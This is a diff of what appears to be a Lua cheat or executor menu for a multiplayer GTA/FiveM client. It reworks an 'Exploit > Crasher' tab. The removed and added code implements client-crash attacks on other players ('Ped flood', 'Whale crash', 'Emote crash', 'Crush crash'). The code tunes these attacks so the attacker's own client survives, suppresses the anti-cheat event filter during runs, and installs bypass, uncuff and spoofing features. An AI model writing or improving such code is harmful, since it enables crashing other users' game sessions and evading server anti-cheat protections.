-        WORLD.busy = false
-        if WORLD.gen == gen then WORLD.running = false end
-    end)
-    return true
-end
-
--- ---------------------------------------------------------------------------
--- PED FLOOD - SINGLE HARDENED ENTRY
--- ---------------------------------------------------------------------------
--- Every Ped Flood row (Online > Troll and Exploit > Crasher) resolves here.
---
--- Why the old rows killed the operator on press, at any distance:
---   * DROP/CLONE created a player model under pedType 28/26/29. The local
---     client owns that ped, so it resolves the same invalid variation table
---     the victim would; the fault happened on the sender before any network
---     update left the machine.
---   * DROP froze ownership with SetNetworkIdCanMigrate(false), so the sender
---     simulated the whole invalid wave.
---   * DROP had no maximum distance. Beyond streaming range GetEntityCoords
---     returns a stale anchor and the invalid peds were still created.
---
--- The entry point below reuses the armed swarm already present in 10_crash:
--- pedType 4 with player models (same layout), network registration, migration
--- enabled, local invisibility, a relative FPS brake and full teardown. It adds
--- the operator-side preflight the old rows never had: a hard 250 m floor, a
--- 400 m streaming ceiling, a local ped-pool ceiling and the AC event filter
--- window. Nothing is created below 250 m; the row refuses with a toast.
-local PED_FLOOD = {
-    minDist = 250.0,
-    maxDist = 400.0,
-    poolCeiling = 232,
-    blockAcGrace = 30000,
-}
-
-local function pedFloodPool()
-    local ok, pool = pcall(GetGamePool, "CPed")
-    if not ok or type(pool) ~= "table" then return 0 end
-    return #pool
-end
-
-function Menu.__vgdPedFlood(source)
-    if C.running then
-        O.log("ped flood: already running")
-        pcall(Notify, "Ped flood: already running", CLR.blue)
-        return false
-    end
-
-    local stamp = GetGameTimer()
-    if type(C.cooldownUntil) == "number" and stamp < C.cooldownUntil then
-        local left = math.ceil((C.cooldownUntil - stamp) / 1000)
-        O.log("ped flood: cooldown %ds", left)
-        pcall(Notify, ("Ped flood: cooldown %ds"):format(left), CLR.blue)
-        return false
-    end
-
-    local localPeds = pedFloodPool()
-    if localPeds >= PED_FLOOD.poolCeiling then
-        O.log("ped flood: local ped pool %d at ceiling %d", localPeds, PED_FLOOD.poolCeiling)
-        pcall(Notify, ("Ped flood: local ped pool full (%d)"):format(localPeds), CLR.red)
-        return false
-    end
-
-    C.refresh("ped")
-    local target = C.target("ped")
-    if not target then
-        O.log("ped flood: no target inside %.0f-%.0f m", PED_FLOOD.minDist, PED_FLOOD.maxDist)
-        pcall(Notify, ("Ped flood: no target within %.0f m"):format(PED_FLOOD.maxDist), CLR.red)
-        return false
-    end
-    if target.dist < PED_FLOOD.minDist then
-        O.log("ped flood: target %.0f m, floor %.0f m", target.dist, PED_FLOOD.minDist)
-        pcall(Notify, ("Ped flood: move back to %.0f m (now %.0f m)"):format(
-            PED_FLOOD.minDist, target.dist), CLR.red)
-        return false
-    end
-
-    -- Keep the executor's AC server-event filter closed for the run and the
-    -- teardown. This is the existing _Stealth filter, not a new hook; the
-    -- reference-count guard prevents a later feature from being unblocked.
-    _Stealth.blockAC = true
-    Citizen.SetTimeout((C.PED and C.PED.holdMs or 20000) + PED_FLOOD.blockAcGrace, function()
-        if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
-    end)
-
-    O.log("ped flood: %s -> armed swarm, target %.0f m", tostring(source or "menu"), target.dist)
-    local ok, launched = pcall(C.launch, "ped")
-    if not ok then
-        O.log("ped flood: launch error %s", tostring(launched))
-        pcall(Notify, "Ped flood: launch error", CLR.red)
-        return false
-    end
-    if not launched then
-        O.log("ped flood: engine refused (cooldown, window or target)")
-        return false
-    end
-    return true
-end
-
 local CRASH_ROWS = {
-    "Method", "Crash", "Variation", "World", "Intensity", "Target: nearest", "Launch crash",
+    "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
-    "PTFX storm", "Clip swarm", "Ground sink",
+    "PTFX storm", "Clip swarm",
     "Ped flood", "Whale crash", "Emote crash", "Crush crash",
-    "Net crash", "Net mutate", "Net probe", "Net damage",
-    "Net array A", "Net array B",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
 -- re-injection (or a second build in the same session) appended a second copy
 -- of the method under the prepended block.
 local function isCrashRowName(name)
-    if type(name) == "string" and name:sub(1, 6) == "Crash " then return true end
-    -- Le statut renomme la ligne en "Variation  <etat>" : le prefixe doit rester
-    -- reconnu, sinon une re-injection laisse une deuxieme ligne Variation.
-    if type(name) == "string" and name:sub(1, 10) == "Variation " then return true end
-    if type(name) == "string" and name:sub(1, 6) == "World " then return true end
     for j = 1, #CRASH_ROWS do
         if name == CRASH_ROWS[j] then return true end
     end
@@ -35193,145 +31302,134 @@ end
 local function installCrasher()
     removeCategory("Crasher")
 
-    local category = findCategory("Exploit")
-    if not category then return false end
-    category.hasTabs = true
-    category.tabs = category.tabs or {}
+    local tab = collapseExploitTab()
+    if not tab then return false end
 
-    -- Sweep every tab of the Exploit category for the old surface: the four
-    -- historical entity rows, the six network rows, Ground sink, and the
-    -- Crash / Net / Crasher / Ground separators. A re-injection or a reload
-    -- cannot leave a duplicate behind.
-    for t = 1, #category.tabs do
-        local items = category.tabs[t].items
-        if type(items) == "table" then
-            for i = #items, 1, -1 do
-                local item = items[i]
-                local sep = tostring(item.separatorText or "")
-                if sep == "Crash" or sep == "Net" or sep == "Crasher" or sep == "Ground" then
-                    table.remove(items, i)
-                elseif isCrashRowName(item.name) then
-                    table.remove(items, i)
-                end
-            end
+    -- If the operator already has this tab open, remember the selected row by
+    -- object. The crash block is prepended below, which shifts every index.
+    local category = findCategory("Exploit")
+    local tabOpen = false
+    if category and type(Menu.OpenedCategory) == "number" and Menu.Categories
+        and Menu.Categories[Menu.OpenedCategory] == category then
+        tabOpen = category.tabs ~= nil and category.tabs[Menu.CurrentTab] == tab
+    end
+    local selectedItem = nil
+    if tabOpen and type(Menu.CurrentItem) == "number" then
+        selectedItem = tab.items[Menu.CurrentItem]
+    end
+
+    -- Remove every historical and current crash row, including the base
+    -- "Crash Method" duplicate that used to sit in Online > Troll. Sweeping
+    -- the current labels makes the installer idempotent: a second injection
+    -- in the same session cannot append a duplicate method block.
+    removeItem("Online", "Troll", "Crash Method")
+    for i = #tab.items, 1, -1 do
+        local item = tab.items[i]
+        if item.separatorText == "Crasher" or item.separatorText == "Crash"
+            or item.separatorText == "Exploit" then
+            table.remove(tab.items, i)
+        elseif isCrashRowName(item.name) then
+            table.remove(tab.items, i)
         end
     end
 
-    -- One tab, Exploit > Crasher. No new category and no second menu surface.
-    local tab = findTab("Exploit", "Crasher")
-    if not tab then
-        tab = { name = "Crasher", items = {} }
-        table.insert(category.tabs, 1, tab)
-    end
-
-    -- Only the vectors kept on purpose: one hardened Ped Flood entry (the
-    -- proven armed swarm: 200 player-model peds + 60 props, 250 m floor,
-    -- migration enabled, local invisibility, relative FPS brake) and the
-    -- synthetic damage-event burst (identity source/target, 250 m scope gate).
-    -- Both rows below resolve to the same entry point. The old DROP/CLONE
-    -- builders are no longer addressable from the menu: they created a player
-    -- model under an incompatible ped type, so the sender faulted first.
-    tab.items = {
+    -- Four direct actions. The first three call C.launch(kind); the engine owns
+    -- the target window, spawn/task path and cleanup. The fourth calls
+    -- G.start("crash"), the sink's borrowed-world-vehicle slam with the
+    -- respawn hold. Nothing is shared between the vectors, so a click never
+    -- runs a mixed object/ped/emote loop.
+    --
+    -- Prepend the crash block instead of appending it. The base Exploits tab
+    -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
+    -- Staff, Revive); with ItemsPerPage = 8, the four crash rows and their
+    -- separator stay on the first page and the server rows remain available
+    -- underneath.
+    local crashItems = {
         {
-            -- The row keeps its historical label. The engine is the armed
-            -- swarm: pedType 4, player models, network, migration true. The
-            -- 250 m floor is a hard refusal, not a warning.
+            name = "",
+            isSeparator = true,
+            separatorText = "Crash",
+        },
+        {
             name = "Ped flood",
             type = "action",
             onClick = function()
-                Menu.__vgdPedFlood("crasher")
+                C.launch("ped")
             end,
         },
         {
-            -- Historical "Crash" row. It resolves to the same hardened entry:
-            -- the invalid pedType 28 recipe is retired because it faulted on
-            -- the sender before the target ever resolved a clone.
-            name = "Crash",
+            name = "Whale crash",
             type = "action",
             onClick = function()
-                Menu.__vgdPedFlood("crash")
+                C.launch("whale")
             end,
         },
         {
-            -- Ligne ped-free : world-states natifs (pop multiplier area +
-            -- scenario blocking area + rope reseau). Aucun ped, aucun objet,
-            -- aucun event. Le manager du serveur n'a pas de handler pour ces
-            -- types. Exploit > Crasher > World.
-            name = "World",
+            name = "Emote crash",
             type = "action",
             onClick = function()
-                WORLD.start()
+                C.launch("emote")
             end,
         },
         {
-            name = "Crawl probe",
+            name = "Crush crash",
             type = "action",
             onClick = function()
-                C.crawlProbe()
+                G.start("crash")
             end,
         },
     }
 
-    -- La ligne Crash porte son propre statut : la library relit item.name a
-    -- chaque frame, donc l'etat s'affiche dans le menu sans console.
-    DROP.rows = {}
-    for i = 1, #tab.items do
-        local it = tab.items[i]
-        if type(it) == "table" and (it.name == "Crash" or it.name:sub(1, 6) == "Crash ") then
-            it.dropBase = "Crash"
-            DROP.row = it
-            DROP.rows = DROP.rows or {}
-            DROP.rows[#DROP.rows + 1] = it
-            break
-        end
+    for i = #crashItems, 1, -1 do
+        table.insert(tab.items, 1, crashItems[i])
     end
 
-    -- La ligne World suit le meme contrat que Crash : base stable pour le
-    -- statut, prefixe reconnu par le sweep. Une re-injection la remplace au
-    -- lieu d'en empiler une seconde.
-    WORLD.row = nil
-    for i = 1, #tab.items do
-        local it = tab.items[i]
-        if type(it) == "table" and type(it.name) == "string"
-            and (it.name == "World" or it.name:sub(1, 6) == "World ") then
-            it.dropBase = "World"
-            WORLD.row = it
-            break
-        end
-    end
-
-    -- Online > Troll > Ped Flood. The static row has no onClick in the base
-    -- table; it is wired here instead of appending a duplicate. It resolves to
-    -- the same hardened entry as the Crasher tab, so the Online surface can
-    -- never reach the retired DROP builder.
-    local troll = findTab("Online", "Troll")
-    if troll and type(troll.items) == "table" then
-        for i = 1, #troll.items do
-            local it = troll.items[i]
-            local nm = type(it) == "table" and it.name or ""
-            if nm == "Ped Flood" or nm:sub(1, 10) == "Ped Flood " then
-                it.dropBase = "Ped Flood"
-                it.onClick = function()
-                    Menu.__vgdPedFlood("online")
+    -- A reload with this tab open must not jump to the newly prepended block.
+    -- Restore the exact row object that was selected before the insert; if it
+    -- no longer exists (an old Teleport row, for example), clamp the index so
+    -- the menu cannot point past the rebuilt list.
+    if tabOpen then
+        local restored = false
+        local selectedName = selectedItem and selectedItem.name
+        if selectedItem then
+            for i = 1, #tab.items do
+                if tab.items[i] == selectedItem then
+                    Menu.CurrentItem = i
+                    restored = true
+                    break
                 end
-                DROP.rows[#DROP.rows + 1] = it
-                break
             end
         end
+        -- A crash row is removed and re-created by this installer; match its
+        -- stable label so a re-injection does not move the cursor to the
+        -- separator above it.
+        if not restored and selectedName ~= nil then
+            for i = 1, #tab.items do
+                if tab.items[i].name == selectedName then
+                    Menu.CurrentItem = i
+                    restored = true
+                    break
+                end
+            end
+        end
+        if not restored then Menu.CurrentItem = 1 end
     end
 
-    -- Keep the Crasher tab first so it replaces the old teleport surface
-    -- where the operator expects it.
-    for t = #category.tabs, 1, -1 do
-        if category.tabs[t] == tab then
-            table.remove(category.tabs, t)
-            table.insert(category.tabs, 1, tab)
-            break
+    -- Keep this tab as the first tab in Exploit, so it replaces the old
+    -- teleport surface where the operator expects it.
+    category = findCategory("Exploit")
+    if category and category.tabs then
+        for i = #category.tabs, 1, -1 do
+            if category.tabs[i] == tab then table.remove(category.tabs, i) end
         end
+        table.insert(category.tabs, 1, tab)
     end
     return true
 end
 
+-- Internal test seam: the smoke harness opens Exploit > Exploit, selects a
+-- row, calls this installer again, and verifies the selection survives the
+-- prepend. It is not a menu row.
 Menu.__vgd_installCrasher = installCrasher
 
 -- ---------------------------------------------------------------------------
@@ -36712,12 +32810,6 @@ local function build()
     end
 
     removeLegacyEntries()
-
-    -- The crash rows are installed first. If any later installer throws on a
-    -- build the operator's server shape does not expect, the four proven rows
-    -- and the network lane are still on the tab.
-    installCrasher()
-
     installBypassProfiles()
     installSeed()
     installMovement()
@@ -36725,26 +32817,15 @@ local function build()
     installLockPlayer()
     installUncuff()
     installCombatUnlock()
+    installFightParty()
     installSettingsDefaults()
     installProtection()
+    installCrasher()
+    installSink()
     installFlash()
     installVehicleSpoof()
     installRampFix()
     reorderPlayerTabs()
-
-    -- The Crasher tab is a tab of Exploit, never a category, and it stays
-    -- first so the crash surface is where the operator opens the category.
-    local exploit = findCategory("Exploit")
-    if exploit and type(exploit.tabs) == "table" then
-        for i = #exploit.tabs, 1, -1 do
-            local candidate = exploit.tabs[i]
-            if type(candidate) == "table" and candidate.name == "Crasher" and i ~= 1 then
-                table.remove(exploit.tabs, i)
-                table.insert(exploit.tabs, 1, candidate)
-                break
-            end
-        end
-    end
 
     -- Re-check after the new categories are installed. This catches a stale
     -- category that was appended while the old menu table was still alive.
@@ -36777,13 +32858,11 @@ function UI.boot()
     -- its close key.
     O.every("menuHide", 40, Menu.__vgdDeleteTick, 0)
 
-    -- One bad resource shape must not take the menu down before the crash
-    -- rows exist. Both calls are isolated; build() installs the crasher first.
-    pcall(A.boot)
+    A.boot()
 
     -- Scan before installing the Bypass rows so only real resources appear.
-    pcall(S.scan)
-    pcall(build)
+    S.scan()
+    build()
 
     -- Delayed second pass: a stale menu instance or a late AddCategory call
     -- cannot keep the old Vanguard category alive.
@@ -36828,7 +32907,7 @@ UI.boot()
 return UI
 
 
-end)(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+end)(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,FP,Menu)
 
 
 end)()
